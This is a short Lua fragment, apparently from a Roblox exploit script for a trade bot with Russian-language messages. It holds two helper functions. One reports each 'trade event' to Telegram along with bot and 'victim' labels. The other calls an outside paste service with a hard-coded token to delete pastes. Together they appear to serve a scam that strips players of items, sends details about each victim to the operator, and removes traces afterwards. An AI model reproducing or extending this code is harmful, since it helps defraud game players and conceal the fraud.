local function telegramTrade(event, detail)
	local lines = {
		tostring(event or "trade event"),
		"бот: " .. botLabel(),
		"жертва: " .. victimLabel(),
	}
	if detail and tostring(detail) ~= "" then
		table.insert(lines, tostring(detail))
	end
	telegramerror(table.concat(lines, "\n"))
end

local function deletePaste(pasteId)
    if not pasteId then
        warn("❌ Paste ID не задан")
        return false
    end

    local ok, response = pcall(function()
        return request({
            Url    = SNAP_API .. "/api/paste/delete/" .. pasteId .. "?token=" .. PASTE_TOKEN,
            Method = "GET",
        })
    end)

    if not ok or not response then
        warn("❌ Ошибка запроса deletePaste")
        return false
    end

    print(("HTTP %s"):format(response.StatusCode or "?"))

    if response.StatusCode == 404 then
        warn("⚠️ Паста уже удалена или не найдена:", pasteId)
        return false
    end

    if response.StatusCode == 200 then
        local parsed
        pcall(function() parsed = HttpService:JSONDecode(response.Body) end)
        if parsed and parsed.ok then
            print("✅ Паста удалена:", pasteId)
            return true
        end
    end

    warn("❌ Не удалось удалить пасту:", response.StatusCode, response.Body)
    return false
end

